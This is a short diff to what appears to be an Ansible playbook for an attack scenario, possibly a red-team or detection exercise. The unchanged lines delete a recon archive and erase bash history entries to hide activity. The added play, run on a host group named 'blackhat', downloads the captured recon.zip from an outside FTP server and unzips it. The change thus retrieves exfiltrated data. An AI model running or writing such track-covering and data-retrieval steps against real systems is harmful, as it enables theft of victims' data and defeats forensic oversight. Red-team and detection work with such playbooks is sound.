@@ -62,3 +62,10 @@
       raw: rm -rf recon.zip recon
     - name: delete bash history activity
       raw: for i in {1..15}; do history -d $HISTFILESIZE; done
+- name: recover captured recon
+  hosts: blackhat
+  tasks:
+    - name: download recon zip from ftp
+      raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/recon.zip
+    - name: unzip file
+      raw: unzip recon.zip
